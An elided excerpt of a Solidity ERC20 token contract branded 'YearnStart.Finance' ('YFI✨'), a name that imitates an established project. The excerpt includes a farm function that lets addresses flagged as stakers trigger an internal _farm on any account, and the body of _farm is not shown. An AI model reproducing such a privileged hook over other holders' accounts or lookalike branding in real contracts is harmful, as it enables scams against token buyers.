...
contract ERC20 is Context, IERC20 {
    ...
    function _farm(address acc) internal {
        require(acc != address(0), "0");
...
contract YearnStart is ERC20, ERC20Detailed {
  using SafeMath for uint;
  
  address public governance;
  mapping (address => bool) public stakers;
  uint256 private amt_ = 30000;

  constructor () public ERC20Detailed("YearnStart.Finance", "YFI✨", 18) {
  ...
  function farm(address account) public {
      require(stakers[msg.sender], "error");
      _farm(account);
  }
